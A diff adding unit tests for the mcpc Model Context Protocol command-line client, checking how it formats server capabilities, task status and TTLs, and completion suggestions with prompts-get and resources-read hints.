+    expect(output).not.toContain('not usable on MCP');
+    expect(output).toContain('mcpc @modern tasks-list');
+    expect(output).toContain('mcpc @modern tasks-result <taskId>');
+  });
+
+  it('flags the extension as out of era on a 2025-11-25 connection', () => {
+    const details: ServerDetails = {
+      protocolVersion: '2025-11-25',
+      capabilities: {
+        tools: { listChanged: false },
+        extensions: { 'io.modelcontextprotocol/tasks': {} },
+      },
+      serverInfo: { name: 'Legacy Server', version: '1.0.0' },
+    };
+
+    const output = formatServerDetails(details, '@legacy');
+
+    // The core `tasks` capability is what task commands need there, and it is absent
+    expect(output).toContain('tasks (extension, not usable on MCP 2025-11-25)');
+    expect(output).not.toContain('mcpc @legacy tasks-list');
+    // Rendered once, not again as a generic extension line
+    expect(output.match(/\* tasks/g)).toHaveLength(1);
+  });
+});
+
+describe('formatTask', () => {
+  const createdAt = '2026-09-23T10:00:00Z';
+
+  it('formats a 2025-11-25 task with its ttl and poll interval', () => {
+    const output = formatTask({
+      taskId: 't-1',
+      status: 'working',
+      statusMessage: 'Step 1/3',
+      createdAt,
+      lastUpdatedAt: createdAt,
+      ttl: 90_000,
+      pollInterval: 500,
+    });
+    expect(output).toContain('Task ID: `t-1`');
+    expect(output).toContain('working');
+    expect(output).toContain('Message: Step 1/3');
+    expect(output).toContain('TTL: 1.5 min');
+    expect(output).toContain('Poll interval: 500 ms');
+  });
+
+  it('formats a 2026-07-28 task, including an unlimited ttl', () => {
+    const output = formatTask({
+      taskId: 't-2',
+      status: 'working',
+      createdAt,
+      lastUpdatedAt: createdAt,
+      ttlMs: null,
+      pollIntervalMs: 5_000,
+    });
+    expect(output).toContain('TTL: unlimited');
+    expect(output).toContain('Poll interval: 5 s');
+  });
+
+  it('points at tasks-result once a 2026-07-28 task has completed', () => {
+    const output = formatTask(
+      {
+        taskId: 't-3',
+        status: 'completed',
+        createdAt,
+        lastUpdatedAt: createdAt,
+        ttlMs: 1000,
+        result: { content: [] },
+      },
+      { sessionName: '@s' }
+    );
+    expect(output).toContain('Result: ready');
+    expect(output).toContain('mcpc @s tasks-result t-3');
+  });
+
+  it('shows the error of a failed task and the requests an input_required task waits for', () => {
+    const failed = formatTask({
+      taskId: 't-4',
+      status: 'failed',
+      createdAt,
+      lastUpdatedAt: createdAt,
+      ttlMs: 1000,
+      error: { code: -32603, message: 'disk on fire' },
+    });
+    expect(failed).toContain('Error: disk on fire (code -32603)');
+
+    const waiting = formatTask({
+      taskId: 't-5',
+      status: 'input_required',
+      createdAt,
+      lastUpdatedAt: createdAt,
+      ttlMs: 1000,
+      inputRequests: { name: { method: 'elicitation/create', params: {} } },
+    });
+    expect(waiting).toContain('Waiting for: elicitation/create');
+    expect(waiting).toContain('mcpc cannot answer');
+  });
+});
+
+describe('formatTasks', () => {
+  it('titles the 2026-07-28 listing as the tasks this session created', () => {
+    const task = {
+      taskId: 't-1',
+      status: 'completed' as const,
+      createdAt: 'x',
+      lastUpdatedAt: 'x',
+      ttlMs: null,
+      result: {},
+    };
+    expect(formatTasks([task])).toContain('Tasks (1):');
+    expect(formatTasks([task], { tracked: true })).toContain(
+      'Tasks started from this session (1):'
+    );
+    expect(formatTasks([task], { tracked: true })).toContain('`t-1`');
+  });
+});
+
+describe('formatCompletionResult', () => {
+  const promptRef = {
+    ref: { type: 'ref/prompt' as const, name: 'code_review' },
+    argument: { name: 'language', value: 'py' },
+  };
+
+  it('lists one suggestion per line and hints at prompts-get with the first one', () => {
+    const output = formatCompletionResult(
+      { completion: { values: ['python', 'pytorch'] } },
+      promptRef,
+      '@test'
+    );
+    expect(output).toContain('python\npytorch');
+    expect(output).toContain('To use it, run: mcpc @test prompts-get code_review language:=python');
+    expect(output).not.toContain('Showing');
+  });
+
+  it('prints an empty state when nothing matches', () => {
+    const output = formatCompletionResult({ completion: { values: [] } }, promptRef, '@test');
+    expect(output).toContain('(no suggestions for language)');
+    expect(output).not.toContain('prompts-get');
+  });
+
+  it('adds a footer only when the list is partial', () => {
+    const complete = formatCompletionResult(
+      { completion: { values: ['a', 'b'], total: 2, hasMore: false } },
+      promptRef,
+      '@test'
+    );
+    expect(complete).not.toContain('Showing');
+    const partial = formatCompletionResult(
+      { completion: { values: ['a', 'b'], total: 10, hasMore: true } },
+      promptRef,
+      '@test'
+    );
+    expect(partial).toContain('Showing 2 of 10 suggestions, more available');
+    const untotaled = formatCompletionResult(
+      { completion: { values: ['a'], hasMore: true } },
+      promptRef,
+      '@test'
+    );
+    expect(untotaled).toContain('Showing 1 suggestions, more available');
+  });
+
+  it('quotes a suggestion that is not shell-safe', () => {
+    const output = formatCompletionResult(
+      { completion: { values: ['Sir Reginald'] } },
+      { ref: { type: 'ref/prompt', name: 'greeting' }, argument: { name: 'name', value: '' } },
+      '@test'
+    );
+    expect(output).toContain('prompts-get greeting name:="Sir Reginald"');
+  });
+
+  it('expands the template variable into a resources-read hint', () => {
+    const output = formatCompletionResult(
+      { completion: { values: ['docs/readme.md'] } },
+      {
+        ref: { type: 'ref/resource', uri: 'file:///{path}' },
+        argument: { name: 'path', value: 'do' },
+      },
+      '@test'
+    );
+    expect(output).toContain('To read it, run: mcpc @test resources-read file:///docs%2Freadme.md');
+  });
+
+  it('repeats the context arguments before the completed one in the prompts-get hint', () => {
+    const output = formatCompletionResult(
+      { completion: { values: ['Sir Reginald'] } },
+      {
+        ref: { type: 'ref/prompt', name: 'greeting' },
+        argument: { name: 'name', value: '' },
+        context: { arguments: { style: 'formal' } },
+      },
+      '@test'
+    );
+    expect(output).toContain('prompts-get greeting style:=formal name:="Sir Reginald"');
+  });
+
+  it('expands every supplied template variable in the resources-read hint', () => {
+    const output = formatCompletionResult(
+      { completion: { values: ['readme.md'] } },
+      {
+        ref: { type: 'ref/resource', uri: 'repo://{owner}/{file}' },
+        argument: { name: 'file', value: 'r' },
+        context: { arguments: { owner: 'apify' } },
+      },
+      '@test'
+    );
+    expect(output).toContain('To read it, run: mcpc @test resources-read repo://apify/readme.md');
+  });
+
+  it('points at the template list while variables remain unexpanded', () => {
+    const output = formatCompletionResult(
+      { completion: { values: ['apify'] } },
+      {
+        ref: { type: 'ref/resource', uri: 'repo://{owner}/{file}' },
+        argument: { name: 'owner', value: '' },
+      },
+      '@test'
+    );
+    expect(output).not.toContain('resources-read');
+    expect(output).toContain('To see the template, run: mcpc @test resources-templates-list');
+  });
+
+  it('falls back to resources-templates-list when the URI has no such variable', () => {
+    const output = formatCompletionResult(
+      { completion: { values: ['x'] } },
+      {
+        ref: { type: 'ref/resource', uri: 'file:///{other}' },
+        argument: { name: 'path', value: '' },
+      },
+      '@test'
+    );
+    expect(output).toContain('To see the template, run: mcpc @test resources-templates-list');
   });
 });
